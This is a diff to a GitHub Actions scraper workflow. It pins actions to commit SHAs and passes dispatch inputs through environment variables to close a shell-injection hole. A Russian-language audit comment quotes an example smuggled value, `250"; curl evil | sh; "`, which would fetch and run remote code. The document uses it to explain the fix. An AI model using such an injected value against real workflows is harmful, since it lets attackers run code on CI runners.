@@ -42,9 +42,9 @@ jobs:
     timeout-minutes: 350
 
     steps:
-      - uses: actions/checkout@v7
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
 
-      - uses: actions/setup-python@v7
+      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7
         with:
           python-version: "3.11"
           cache: pip
@@ -73,11 +73,27 @@ jobs:
           # при бане — pass_plan.BAN_ROLLBACK_STREAK.
           KRISHA_DELAY_MIN: "${{ github.event.inputs.delay_min }}"
           KRISHA_DELAY_MAX: "${{ github.event.inputs.delay_max }}"
+          # Аудит безопасности 2026-10-06: inputs workflow_dispatch нельзя
+          # подставлять в `run:` выражениями — GitHub раскрывает их ДО запуска
+          # shell, и значение вроде `250"; curl evil | sh; "` становилось
+          # командой (shell-инъекция). Через env значение приходит данными, а
+          # не кодом. Сейчас dispatch доступен только владельцу, но защита не
+          # должна зависеть от того, кто нажал кнопку. По расписанию inputs
+          # пусты, и дефолты (`:-`) срабатывают так же, как раньше `|| '250'`.
+          INPUT_PAGES: ${{ github.event.inputs.pages }}
+          INPUT_MAX_NEW: ${{ github.event.inputs.max_new }}
+          INPUT_TIME_BUDGET_MIN: ${{ github.event.inputs.time_budget_min }}
         run: |
+          # Пустой max_new = «не передавать --max-new» (пресет режима, см. выше),
+          # поэтому флаг добавляем только непустому значению.
+          max_new_args=()
+          if [ -n "${INPUT_MAX_NEW:-}" ]; then
+            max_new_args=(--max-new "$INPUT_MAX_NEW")
+          fi
           python scripts/rescrape.py \
-            --pages "${{ github.event.inputs.pages || '250' }}" \
-            ${{ github.event.inputs.max_new && format('--max-new {0}', github.event.inputs.max_new) || '' }} \
-            --time-budget-min "${{ github.event.inputs.time_budget_min || '320' }}" \
+            --pages "${INPUT_PAGES:-250}" \
+            "${max_new_args[@]}" \
+            --time-budget-min "${INPUT_TIME_BUDGET_MIN:-320}" \
             --fail-empty \
             --fail-below 8000 \
             --summary-json /tmp/rescrape_stats.json
